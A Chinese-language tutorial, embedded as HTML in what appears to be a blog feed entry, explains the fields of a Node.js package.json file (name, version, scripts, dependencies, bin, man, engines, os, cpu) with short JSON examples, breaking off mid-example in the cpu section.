      "summary": "前言\npackage.json 是 Node.js 应用中比较重要的部分, 它定义了项目的依赖关系, 这里将介绍该文件各个配置项的作用。\n\n",
      "content_html": "<div><p>前言</p>\n<p>package.json 是 Node.js 应用中比较重要的部分, 它定义了项目的依赖关系, 这里将介绍该文件各个配置项的作用。</p>\n</div>\n\n<h2 id=\"创建-package-json-文件\" tabindex=\"-1\"> 创建 package.json 文件</h2>\n<div><p>提示</p>\n<p>安装包的信息可保持到项目的 <code>package.json</code> 文件中, 以便后续的其它的项目开发或者他人合作使用, 也说 <code>package.json</code> 在项目中是必不可少的。</p>\n</div>\n<div><pre><code><span>npm</span> init\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"package-json-文件解读\" tabindex=\"-1\"> package.json 文件解读</h2>\n<h3 id=\"默认值\" tabindex=\"-1\"> 默认值</h3>\n<p><code>npm</code> 会根据包内容设置一些默认值。</p>\n<ul>\n<li>\n<p><code>&quot;scripts&quot;: {&quot;start&quot;: &quot;node server.js&quot;}</code> -- 如果包的根目录有 <code>server.js</code> 文件, <code>npm</code> 会默认将 <code>start</code> 命令设置为 <code>node server.js</code> 。</p>\n</li>\n<li>\n<p><code>&quot;scripts&quot;:{&quot;preinstall&quot;: &quot;node-waf clean || true;node-waf configure build&quot;}</code> -- 如果包的根目录有 <code>wscript</code> 文件, <code>npm</code> 会默认将 <code>preinstall</code> 命令用 <code>node-waf</code> 进行编译。</p>\n</li>\n<li>\n<p><code>&quot;scripts&quot;:{&quot;preinstall&quot;: &quot;node-gyp rebuild&quot;}</code> -- 如果包的根目录有 <code>binding.gyp</code> 文件, <code>npm</code> 会默认将 <code>preinstall</code> 命令用 <code>node-gyp</code> 进行编译。</p>\n</li>\n<li>\n<p><code>&quot;contributors&quot;: [...]</code> -- 如果包的根目录有 <code>AUTHORS</code> 文件, <code>npm</code> 会默认逐行按 <code>Name &lt;email(url)</code> 格式处理, 邮箱和 <code>url</code> 是可选的。 <code>#号</code> 和 <code>空格</code> 开头的行会被忽略。</p>\n</li>\n</ul>\n<h3 id=\"name\" tabindex=\"-1\"> name</h3>\n<div><p>作用</p>\n<p>在 <code>package.json</code> 中最重要的就是 <code>name</code> 和 <code>version</code> 字段。他们都是必须的, 如果没有就无法 <code>install</code> 。 <code>name</code> 和 <code>version</code> 一起组成的标识在假设中是唯一的。改变包应该同时改变 <code>version</code> 。<br> name 是这个东西的名字。注意:</p>\n</div>\n<ul>\n<li>不要把 <code>node</code> 或者 <code>js</code> 放在名字中。因为你写了 <code>package.json</code> 它就被假定成为了 <code>js</code> , 不过你可以用 <code>&quot;engine&quot;字段</code> 指定一个引擎（见后文）。</li>\n<li>这个名字会作为在 <code>URL</code> 的一部分、命令行的参数或者文件夹的名字。任何 <code>non-url-safe</code> 的字符都是不能用的。</li>\n<li>这个名字可能会作为参数被传入 <code>require()</code> , 所以它应该比较短, 但也要意义清晰。</li>\n<li>在你爱上你的名字之前, 你可能要去 <code>npm registry</code> 查看一下这个名字是否已经被使用了。<a href=\"http://registry.npmjs.org/\" target=\"_blank\" rel=\"noopener noreferrer\">http://registry.npmjs.org/</a></li>\n</ul>\n<h3 id=\"version\" tabindex=\"-1\"> version</h3>\n<div><p>作用</p>\n<p>在 <code>package.json</code> 中最重要的就是 <code>name</code> 和 <code>version</code> 字段。他们都是必须的, 如果没有就无法 <code>install</code> 。 <code>name</code> 和 <code>version</code> 一起组成的标识在假设中是唯一的。改变包应该同时改变 <code>version</code> 。<br> <code>version</code> 必须能被 <code>node-semver</code> 解析, 它被包在 <code>npm</code> 的依赖中。（要自己用可以执行 <code>npm install semver</code> ）</p>\n</div>\n<p>可用的&quot;数字&quot;或者&quot;范围&quot;见 <a href=\"http://npmjs.org/doc/misc/semver.html\" target=\"_blank\" rel=\"noopener noreferrer\">semver</a>。</p>\n<h3 id=\"description\" tabindex=\"-1\"> description</h3>\n<p>放简介, 字符串。方便屌丝们在 <code>npm search</code> 中搜索。</p>\n<h3 id=\"keywords\" tabindex=\"-1\"> keywords</h3>\n<p>关键字, 数组、字符串。还是方便屌丝们在 <code>npm search</code> 中搜索。</p>\n<h3 id=\"homepage\" tabindex=\"-1\"> homepage</h3>\n<p>项目官网的 <code>url</code> 。</p>\n<p>注意: 这和 <code>“url”</code> 不一样。如果你放一个 <code>“url”</code> 字段, <code>registry</code> 会以为是一个跳转到你发布在其他地方的地址, 然后喊你滚粗。</p>\n<p>嗯, 滚粗, 没开玩笑。</p>\n<h3 id=\"bugs\" tabindex=\"-1\"> bugs</h3>\n<p>你项目的提交问题的 <code>url</code> 和（或） <code>邮件地址</code> 。这对遇到问题的屌丝很有帮助。 差不多长这样:</p>\n<div><pre><code><span>{</span>\n  <span>\"url\"</span><span>:</span> <span>\"https://github.com/owner/project/issues\"</span><span>,</span>\n  <span>\"email\"</span><span>:</span> <span>\"project@hostname.com\"</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><p>你可以指定一个或者指定两个。如果你只想提供一个 <code>url</code> , 那就不用对象了, 字符串就行。 如果提供了 <code>url</code> , 它会被 <code>npm bugs</code> 命令使用。</p>\n<h3 id=\"license\" tabindex=\"-1\"> license</h3>\n<div><p>作用</p>\n<p>你应该要指定一个许可证, 让人知道使用的权利和限制的。<br> 最简单的方法是, 假如你用一个像 <code>BSD</code> 或者 <code>MIT</code> 这样通用的许可证, 就只需要指定一个许可证的名字, 像这样:</p>\n</div>\n<div><pre><code><span>{</span>\n  <span>\"license\"</span><span>:</span> <span>\"BSD\"</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p>如果你又更复杂的许可条件, 或者想要提供给更多地细节, 可以这样:</p>\n<div><pre><code><span>\"licenses\"</span> <span>:</span> <span>[</span>\n  <span>{</span>\n    <span>\"type\"</span> <span>:</span> <span>\"MyLicense\"</span> <span>,</span>\n    <span>\"url\"</span> <span>:</span> <span>\"&lt;https://github.com/owner/project/path/to/license>\"</span>\n  <span>}</span>\n<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>在根目录中提供一个许可证文件也蛮好的。</p>\n<h3 id=\"people-fields-author-contributors\" tabindex=\"-1\"> people fields: author, contributors</h3>\n<p><code>author</code> 是一个人。 <code>contributors</code> 是一堆人的数组。 <code>person</code> 是一个有 <code>name</code> 字段, 可选的有 <code>url</code> 、 <code>email</code> 字段的对象, 像这样:</p>\n<div><pre><code><span>{</span>\n  <span>\"name\"</span><span>:</span> <span>\"Barney Rubble\"</span><span>,</span>\n  <span>\"email\"</span><span>:</span> <span>\"b@rubble.com\"</span><span>,</span>\n  <span>\"url\"</span><span>:</span> <span>\"https://barnyrubble.tumblr.com/\"</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><p>或者可以把所有的东西都放到一个字符串里, <code>npm </code> `会给你解析:</p>\n<div><pre><code><span>{</span>\n  <span>\"Barney Rubble &lt;b@rubble.com> (https://barnyrubble.tumblr.com/)\"</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p><code>email</code> 和 <code>url</code> 在两种形式中都是可选的。</p>\n<p>也可以在你的 <code>npm</code> 用户信息中设置一个顶级的 <code>maintainers</code> 字段。</p>\n<h3 id=\"files\" tabindex=\"-1\"> files</h3>\n<p><code>files</code> 是一个包含项目中的文件的数组。如果命名了一个文件夹, 那也会包含文件夹中的文件。（除非被其他条件忽略了）</p>\n<p>你也可以提供一个 <code>.npmignore</code> 文件, 让即使被包含在 <code>files</code> 字段中得文件被留下。其实就像 <code>.gitignore</code> 一样。</p>\n<h3 id=\"main\" tabindex=\"-1\"> main</h3>\n<p><code>main</code> 字段配置一个文件名指向模块的入口程序。如果你包的名字叫 <code>foo</code> , 然后用户 <code>require(&quot;foo&quot;)</code> , <code>main</code> 配置的模块的 <code>exports</code> 对象会被返回。</p>\n<p>这应该是一个相对于根目录的文件路径。</p>\n<p>对于大多数模块, 它是非常有意义的, 其他的都没啥。</p>\n<h3 id=\"bin\" tabindex=\"-1\"> bin</h3>\n<p>很多包都有一个或多个可执行的文件希望被放到 <code>PATH</code> 中。 <code>npm</code> 让妈妈再也不用担心了（实际上, 就是这个功能让 <code>npm</code> 可执行的）。</p>\n<p>要用这个功能, 给 <code>package.json</code> 中的 <code>bin</code> 字段一个命令名到文件位置的 <code>map</code> 。初始化的时候 <code>npm</code> 会将他链接到 <code>prefix/bin（全局初始化）</code> 或者 <code>./node_modules/.bin/（本地初始化）</code> 。</p>\n<p>比如, <code>npm</code> 有:</p>\n<div><pre><code><span>{</span>\n  <span>\"bin\"</span><span>:</span> <span>{</span>\n    <span>\"npm\"</span><span>:</span> <span>\"./cli.js\"</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><p>所以, 当你初始化 <code>npm</code> , 它会创建一个符号链接到 <code>cli.js</code> 脚本到 <code>/usr/local/bin/npm</code> 。</p>\n<p>如果你只有一个可执行文件, 并且名字和包名一样。那么你可以只用一个字符串, 比如:</p>\n<div><pre><code><span>{</span>\n  <span>\"name\"</span><span>:</span> <span>\"my-program\"</span><span>,</span>\n  <span>\"version\"</span><span>:</span> <span>\"1.2.5\"</span><span>,</span>\n  <span>\"bin\"</span><span>:</span> <span>\"./path/to/program\"</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><p>结果和这个一样:</p>\n<div><pre><code><span>{</span>\n  <span>\"name\"</span><span>:</span> <span>\"my-program\"</span><span>,</span>\n  <span>\"version\"</span><span>:</span> <span>\"1.2.5\"</span><span>,</span>\n  <span>\"bin\"</span><span>:</span> <span>{</span>\n    <span>\"my-program\"</span><span>:</span> <span>\"./path/to/program\"</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"man\" tabindex=\"-1\"> man</h3>\n<p>指定一个单一的文件或者一个文件数组供 <code>man</code> 程序使用。如果只提供一个单一的文件, 那么它初始化后就是 <code>man &lt;pkgname&gt;</code> 的结果, 而不管实际的文件名是神马, 比如:</p>\n<div><pre><code><span>{</span>\n  <span>\"name\"</span><span>:</span> <span>\"foo\"</span><span>,</span>\n  <span>\"version\"</span><span>:</span> <span>\"1.2.3\"</span><span>,</span>\n  <span>\"description\"</span><span>:</span> <span>\"A packaged foo fooer for fooing foos\"</span><span>,</span>\n  <span>\"main\"</span><span>:</span> <span>\"foo.js\"</span><span>,</span>\n  <span>\"man\"</span><span>:</span> <span>\"./man/doc.1\"</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>这样 <code>man foo</code> 就可以用到 <code>./man/doc.1</code> 文件了。</p>\n<p>如果文件名不是以包名开头, 那么它会被冠以前缀, 下面的:</p>\n<div><pre><code><span>{</span>\n  <span>\"name\"</span><span>:</span> <span>\"foo\"</span><span>,</span>\n  <span>\"version\"</span><span>:</span> <span>\"1.2.3\"</span><span>,</span>\n  <span>\"description\"</span><span>:</span> <span>\"A packaged foo fooer for fooing foos\"</span><span>,</span>\n  <span>\"main\"</span><span>:</span> <span>\"foo.js\"</span><span>,</span>\n  <span>\"man\"</span><span>:</span> <span>[</span><span>\"./man/foo.1\"</span><span>,</span> <span>\"./man/bar.1\"</span><span>]</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>会为 <code>man foo</code> 和 <code>man foo-bar</code> 创建文件。</p>\n<p><code>man</code> 文件需要以数字结束, 然后可选地压缩后以 <code>.gz</code> 为后缀。</p>\n<div><pre><code><span>{</span>\n  <span>\"name\"</span><span>:</span> <span>\"foo\"</span><span>,</span>\n  <span>\"version\"</span><span>:</span> <span>\"1.2.3\"</span><span>,</span>\n  <span>\"description\"</span><span>:</span> <span>\"A packaged foo fooer for fooing foos\"</span><span>,</span>\n  <span>\"main\"</span><span>:</span> <span>\"foo.js\"</span><span>,</span>\n  <span>\"man\"</span><span>:</span> <span>[</span><span>\"./man/foo.1\"</span><span>,</span> <span>\"./man/foo.2\"</span><span>]</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>会为 <code>man foo</code> 和 <code>man 2 foo</code> 创建。</p>\n<h3 id=\"directories\" tabindex=\"-1\"> directories</h3>\n<p><code>CommonJS Packages</code> 规范说明了几种方式让你可以用 <code>directorieshash</code> 标示出包得结构。如果看一下 <code>npm's package.json</code> , 你会看到有 <code>directories</code> 标示出 doc, lib, and man。</p>\n<p>在未来, 这个信息可能会被用到。</p>\n<h3 id=\"directories-lib\" tabindex=\"-1\"> directories.lib</h3>\n<p>告诉屌丝们你的库文件夹在哪里。目前没有什么特别的东西需要用到 <code>lib</code> 文件夹, 但确实是重要的元信息。</p>\n<h3 id=\"directories-bin\" tabindex=\"-1\"> directories.bin</h3>\n<p>如果你指定一个 <code>&quot;bin&quot;</code> 目录, 然后在那个文件夹中得所有文件都会被当做 <code>&quot;bin&quot;</code> 字段使用。<br> 如果你已经指定了 <code>&quot;bin&quot;</code> 字段, 那这个就无效。</p>\n<h3 id=\"directories-man\" tabindex=\"-1\"> directories.man</h3>\n<p>一个放满 <code>man</code> 页面的文件夹。贴心地创建一个 <code>&quot;man&quot;</code> 字段。</p>\n<h3 id=\"directories-doc\" tabindex=\"-1\"> directories.doc</h3>\n<p>将 <code>markdown</code> 文件放在这里。最后, 这些会被很好地展示出来,</p>\n<h3 id=\"directories-example\" tabindex=\"-1\"> directories.example</h3>\n<p>将事例脚本放在这里。某一天, 它可能会以聪明的方式展示出来。</p>\n<h3 id=\"repository\" tabindex=\"-1\"> repository</h3>\n<div><p>作用</p>\n<p>指定你的代码存放的地方。这个对希望贡献的人有帮助。如果 git 仓库在 github 上, 那么 npm docs 命令能找到你。</p>\n</div>\n<p>这样做:</p>\n<div><pre><code><span>\"repository\"</span> <span>:</span> <span>{</span>\n  <span>\"type\"</span> <span>:</span> <span>\"git\"</span> <span>,</span>\n  <span>\"url\"</span> <span>:</span> <span>\"&lt;https://github.com/isaacs/npm.git>\"</span>\n<span>}</span>\n\n<span>\"repository\"</span> <span>:</span> <span>{</span>\n  <span>\"type\"</span> <span>:</span> <span>\"svn\"</span> <span>,</span>\n  <span>\"url\"</span> <span>:</span> <span>\"&lt;http://v8.googlecode.com/svn/trunk/>\"</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>URL</code> 应该是公开的（即便是只读的）能直接被未经过修改的版本控制程序处理的 <code>url</code> 。不应该是一个 html 的项目页面。因为它是给计算机看的。</p>\n<h3 id=\"scripts\" tabindex=\"-1\"> scripts</h3>\n<p><code>&quot;scripts&quot;</code> 是一个由脚本命令组成的 <code>hash</code> 对象, 他们在包不同的生命周期中被执行。 <code>key</code> 是生命周期事件, <code>value</code> 是要运行的命令。<br> 参见 <a href=\"http://npmjs.org/doc/misc/npm-scripts.html\" target=\"_blank\" rel=\"noopener noreferrer\">npm-scripts</a></p>\n<h3 id=\"config\" tabindex=\"-1\"> config</h3>\n<p><code>&quot;config&quot; hash</code> 可以用来配置用于包脚本中的跨版本参数。在实例中, 如果一个包有下面的配置:</p>\n<div><pre><code><span>{</span>\n  <span>\"name\"</span><span>:</span> <span>\"foo\"</span><span>,</span>\n  <span>\"config\"</span><span>:</span> <span>{</span>\n    <span>\"port\"</span><span>:</span> <span>\"8080\"</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>然后有一个 <code>“start”</code> 命令引用了 <code>npm_package_config_port</code> 环境变量, 用户可以通过 <code>npm config set foo:port 8001</code> 来重写他。</p>\n<p>参见 <a href=\"http://npmjs.org/doc/misc/npm-config.html\" target=\"_blank\" rel=\"noopener noreferrer\">npm-config</a> 和 <a href=\"http://npmjs.org/doc/misc/npm-scripts.html\" target=\"_blank\" rel=\"noopener noreferrer\">npm-scripts</a>。</p>\n<h3 id=\"dependencies\" tabindex=\"-1\"> dependencies</h3>\n<div><p>作用</p>\n<p>依赖是给一组包名指定版本范围的一个 <code>hash</code> 。这个版本范围是一个由一个或多个空格分隔的字符串。依赖还可以用 <code>tarball</code> 或者 <code>git URL</code> 。<br> 请不要将测试或过渡性的依赖放在 <code>dependencieshash</code> 中。见下文的 <code>devDependencies</code> 。<br> 详见 <a href=\"http://npmjs.org/doc/misc/semver.html\" target=\"_blank\" rel=\"noopener noreferrer\">semver</a></p>\n</div>\n<ul>\n<li><code>version</code> 必须完全和 <code>version</code> 一致</li>\n<li><code>&gt;version</code> 必须比 <code>version</code> 大</li>\n<li><code>&gt;=version</code> 同上</li>\n<li><code>&lt;version</code> 同上</li>\n<li><code>&lt;=version</code> 同上</li>\n<li><code>~version</code> 大约一样, 见 <a href=\"http://npmjs.org/doc/misc/semver.html\" target=\"_blank\" rel=\"noopener noreferrer\">semver</a></li>\n<li><code>1.2.x</code> , <code>1.2.0</code> , <code>1.2.1</code> , 等, 但不包括 <code>1.3.0</code></li>\n<li><code>//...</code> 见下文 <code>'依赖 URL'</code></li>\n<li><code>*</code> 所有</li>\n<li><code>&quot;&quot;</code> 空, 同 <code>*</code></li>\n<li><code>version1 - version2</code> 同 <code>&gt;=version1 &lt;=version2</code></li>\n<li><code>range1 || range2</code> 二选一。</li>\n<li><code>git...</code> 见下文 <code>'依赖Git URL'</code></li>\n<li><code>user/repo</code> 见下文 <code>'GitHub URLs'</code> 比如下面都是合法的:</li>\n</ul>\n<div><pre><code><span>{</span>\n  <span>\"dependencies\"</span><span>:</span> <span>{</span>\n    <span>\"foo\"</span><span>:</span> <span>\"1.0.0 - 2.9999.9999\"</span><span>,</span>\n    <span>\"bar\"</span><span>:</span> <span>\">=1.0.2 &lt;2.1.2\"</span><span>,</span>\n    <span>\"baz\"</span><span>:</span> <span>\">1.0.2 &lt;=2.3.4\"</span><span>,</span>\n    <span>\"boo\"</span><span>:</span> <span>\"2.0.1\"</span><span>,</span>\n    <span>\"qux\"</span><span>:</span> <span>\"&lt;1.0.0 || >=2.3.1 &lt;2.4.5 || >=2.5.2 &lt;3.0.0\"</span><span>,</span>\n    <span>\"asd\"</span><span>:</span> <span>\"https://asdf.com/asdf.tar.gz\"</span><span>,</span>\n    <span>\"til\"</span><span>:</span> <span>\"~1.2\"</span><span>,</span>\n    <span>\"elf\"</span><span>:</span> <span>\"~1.2.3\"</span><span>,</span>\n    <span>\"two\"</span><span>:</span> <span>\"2.x\"</span><span>,</span>\n    <span>\"thr\"</span><span>:</span> <span>\"3.3.x\"</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"依赖-url\" tabindex=\"-1\"> 依赖 URL</h3>\n<div><p>提示</p>\n<p>可以指定一个 <code>tarball URL</code> , 这个 <code>tarball</code> 将在包被初始化的时候下载并初始化。</p>\n</div>\n<h3 id=\"依赖-git-url\" tabindex=\"-1\"> 依赖 Git URL</h3>\n<p><code>Git urls</code> 可以是下面几种形式:</p>\n<ul>\n<li>git: <a href=\"https://github.com/user/project.git#commit-ish\" target=\"_blank\" rel=\"noopener noreferrer\">https://github.com/user/project.git#commit-ish</a></li>\n<li>git+ssh: <a href=\"https://user@hostname:project.git#commit-ish\" target=\"_blank\" rel=\"noopener noreferrer\">https://user@hostname:project.git#commit-ish</a></li>\n<li>git+ssh: <a href=\"https://user@hostname/project.git#commit-ish\" target=\"_blank\" rel=\"noopener noreferrer\">https://user@hostname/project.git#commit-ish</a></li>\n<li>git+<a href=\"https://user@hostname/project/blah.git#commit-ish\" target=\"_blank\" rel=\"noopener noreferrer\">https://user@hostname/project/blah.git#commit-ish</a></li>\n<li>git+<a href=\"https://user@hostname/project/blah.git#commit-ish\" target=\"_blank\" rel=\"noopener noreferrer\">https://user@hostname/project/blah.git#commit-ish</a></li>\n</ul>\n<p><code>commit-ish</code> 是可以被 <code>git checkout</code> 的任何 <code>tag、sha</code> 或者 <code>branch</code> 。默认为 <code>master</code> 。</p>\n<h3 id=\"github-urls\" tabindex=\"-1\"> GitHub URLs</h3>\n<p><code>1.1.65</code> 版后, 你可以仅仅用 <code>“user/foo-project”</code> 引用 <code>GitHub urls</code> , 比如:</p>\n<div><pre><code><span>{</span>\n  <span>\"name\"</span><span>:</span> <span>\"foo\"</span><span>,</span>\n  <span>\"version\"</span><span>:</span> <span>\"0.0.0\"</span><span>,</span>\n  <span>\"dependencies\"</span><span>:</span> <span>{</span>\n    <span>\"express\"</span><span>:</span> <span>\"visionmedia/express\"</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"devdependencies\" tabindex=\"-1\"> devDependencies</h3>\n<div><p>作用</p>\n<p>如果有人要使用你的模块, 那么他们可能不需要你开发使用的外部测试或者文档框架。<br> 在这种情况下, 最好将这些附属的项目列在 <code>devDependencies</code> 中。</p>\n</div>\n<p>这些东西会在执行 <code>npm link</code> 或者 <code>npm install</code> 的时候初始化, 并可以像其他 <code>npm</code> 配置参数一样管理。详见 <a href=\"http://npmjs.org/doc/misc/npm-config.html\" target=\"_blank\" rel=\"noopener noreferrer\">npm-config</a>。</p>\n<p>对于非特定平台的构建步骤, 比如需要编译 <code>CoffeeScript</code> , 可以用 <code>prepublish</code> 脚本去实现, 并把它依赖的包放在 <code>devDependency</code> 中。（注: <code>prepublish</code> 定义了在执行 <code>npm publish</code> 的时候先行执行的脚本）</p>\n<p>比如:</p>\n<div><pre><code><span>{</span>\n  <span>\"name\"</span><span>:</span> <span>\"ethopia-waza\"</span><span>,</span>\n  <span>\"description\"</span><span>:</span> <span>\"a delightfully fruity coffee varietal\"</span><span>,</span>\n  <span>\"version\"</span><span>:</span> <span>\"1.2.3\"</span><span>,</span>\n  <span>\"devDependencies\"</span><span>:</span> <span>{</span>\n    <span>\"coffee-script\"</span><span>:</span> <span>\"~1.6.3\"</span>\n  <span>}</span><span>,</span>\n  <span>\"scripts\"</span><span>:</span> <span>{</span>\n    <span>\"prepublish\"</span><span>:</span> <span>\"coffee -o lib/ -c src/waza.coffee\"</span>\n  <span>}</span><span>,</span>\n  <span>\"main\"</span><span>:</span> <span>\"lib/waza.js\"</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>prepublish</code> 脚本会在 <code>publishing</code> 前运行, 这样用户就不用自己去 <code>require</code> 来编译就能使用。并且在开发模式中（比如本地运行 <code>npm install</code> ）会运行这个脚本以便更好地测试。</p>\n<h3 id=\"peerdependencies\" tabindex=\"-1\"> peerDependencies</h3>\n<div><p>作用</p>\n<p>在一些场景中, 如在一个 <code>host</code> 中不必须进行 <code>require</code> 时候, 你想表现你的 <code>package</code> 与一个 <code>host</code> 工具或者库的兼容关键。这一般用来引用插件。尤其是你的模块可能要暴露一个特定的接口, 并由 <code>host</code> 文档来预期和指定。</p>\n</div>\n<p>比如:</p>\n<div><pre><code><span>{</span>\n  <span>\"name\"</span><span>:</span> <span>\"tea-latte\"</span><span>,</span>\n  <span>\"version\"</span><span>:</span> <span>\"1.3.5\"</span><span>,</span>\n  <span>\"peerDependencies\"</span><span>:</span> <span>{</span>\n    <span>\"tea\"</span><span>:</span> <span>\"2.x\"</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>这能保证你的 <code>package</code> 可以只和 <code>tea</code> 的 <code>2.x 版本</code> 一起初始化。</p>\n<p>试图初始化另一个有会冲突的依赖的插件将导致一个错误。因此, 确保你的插件的需求约束越弱越好, 而不要去把它锁定到一个特定的版本。</p>\n<p>假设这个 <code>host</code> 遵守 <code>semver</code> 规范, 只改变这个 <code>package</code> 的主版本会打破你的插件。因此, 如果你在 <code>package</code> 中用过每个 <code>1.x 版本</code> , 就用 <code>&quot;^1.0&quot;</code> 或者 &quot; <code>1.x&quot;</code> 来表示。如果你依赖于功能介绍 <code>1.5.2</code> , 用 <code>&quot;&gt;= 1.5.2 &lt; 2&quot;</code> 。</p>\n<h3 id=\"bundleddependencies\" tabindex=\"-1\"> bundledDependencies</h3>\n<div><p>作用</p>\n<p>一组包名, 他们会在发布的时候被打包进去。<br> 拼成 <code>&quot;bundleDependencies&quot;</code> （缺 d）也可以: <code>optionalDependencies</code> 。</p>\n</div>\n<p>如果一个依赖可用, 但你希望在它安装错误的时候 <code>npm</code> 也能继续初始化, 那么你可以把它放在 <code>optionalDependencies hash</code> 中。这是一个包名到版本或者 <code>url</code> 的 <code>map</code> , 就像 <code>dependencies hash</code> 一样。只是它运行错误。</p>\n<p>处理缺乏依赖也是你的程序的责任。比如像这样:</p>\n<div><pre><code><span>try</span> <span>{</span>\n  <span>var</span> foo <span>=</span> <span>require</span><span>(</span><span>\"foo\"</span><span>)</span><span>;</span>\n  <span>var</span> fooVersion <span>=</span> <span>require</span><span>(</span><span>\"foo/package.json\"</span><span>)</span><span>.</span>version<span>;</span>\n<span>}</span> <span>catch</span> <span>(</span>er<span>)</span> <span>{</span>\n  foo <span>=</span> <span>null</span><span>;</span>\n<span>}</span>\n<span>if</span> <span>(</span><span>notGoodFooVersion</span><span>(</span>fooVersion<span>)</span><span>)</span> <span>{</span>\n  foo <span>=</span> <span>null</span><span>;</span>\n<span>}</span>\n\n<span>// .. then later in your program ..</span>\n\n<span>if</span> <span>(</span>foo<span>)</span> <span>{</span>\n  foo<span>.</span><span>doFooThings</span><span>(</span><span>)</span><span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>optionalDependencies</code> 会覆盖 <code>dependencies</code> 中同名的项, 所以通常比只放在一个地方好。</p>\n<h3 id=\"engines\" tabindex=\"-1\"> engines</h3>\n<p>你可以指定工作的 <code>node</code> 的版本:</p>\n<div><pre><code><span>{</span>\n  <span>\"engines\"</span><span>:</span> <span>{</span>\n    <span>\"node\"</span><span>:</span> <span>\">=0.10.3 &lt;0.12\"</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><div><p>作用</p>\n<p>像 <code>dependensies</code> 一样, 如果你不指定版本或者指定 <code>&quot;*&quot;</code> 作为版本, 那么所有版本的 <code>node</code> 都可以。</p>\n</div>\n<p>如果指定一个 <code>&quot;engines&quot;</code> 字段, 那么 <code>npm</code> 会需要 <code>node</code> 在里面, 如果 <code>&quot;engines&quot;</code> 被省略, <code>npm</code> 会假定它在 <code>node</code> 上工作。</p>\n<p>你也可以用 <code>&quot;engines&quot;</code> 字段来指定哪一个 <code>npm</code> 版本能更好地初始化你的程序, 如:</p>\n<div><pre><code><span>{</span>\n  <span>\"engines\"</span><span>:</span> <span>{</span>\n    <span>\"npm\"</span><span>:</span> <span>\"~1.0.20\"</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><p>记住, 除非用户设置 <code>engine-strict</code> 标记, 这个字段只是建议值。</p>\n<h3 id=\"enginestrict\" tabindex=\"-1\"> engineStrict</h3>\n<p>如果你确定你的模块一定不会运行在你指定版本之外的 <code>node</code> 或者 <code>npm</code> 上, 你可以在 <code>package.json</code> 文件中设置 <code>&quot;engineStrict&quot;:true</code> 。它会重写用户的 <code>engine-strict</code> 设置。</p>\n<p>除非你非常非常确定, 否则不要这样做。如果你的 <code>engines hash</code> 过度地限制, 很可能轻易让自己陷入窘境。慎重地考虑这个选择。如果大家滥用它, 它会再以后的 <code>npm</code> 版本中被删除。</p>\n<h3 id=\"os\" tabindex=\"-1\"> os</h3>\n<p>你可以指定你的模块要运行在哪些操作系统中:</p>\n<div><pre><code><span>{</span>\n  <span>\"os\"</span><span>:</span> <span>[</span><span>\"darwin\"</span><span>,</span> <span>\"linux\"</span><span>]</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p>你也可以用黑名单代替白名单, 在名字前面加上&quot;!&quot;就可以了:</p>\n<div><pre><code><span>{</span>\n  <span>\"os\"</span><span>:</span> <span>[</span><span>\"!win32\"</span><span>]</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p>操作系统用 <code>process.platform</code> 来探测。虽然没有很好地理由, 但它是同时支持黑名单和白名单的。</p>\n<h3 id=\"cpu\" tabindex=\"-1\"> cpu</h3>\n<p>如果你的代码只能运行在特定的 <code>cpu</code> 架构下, 你可以指定一个:</p>\n<div><pre><code><span>{</span>\n  <span>\"cpu\"</span><span>:</span> <span>[</span><span>\"x64\"</span><span>,</span> <span>\"ia32\"</span><span>]</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p>就像 <code>os</code> 选项, 你也可以黑一个架构:</p>\n<div><pre><code><span>{</span>\n  <span>\"cpu\"</span><span>:</span> <span>[</span><span>\"!arm\"</span><span>,</span> 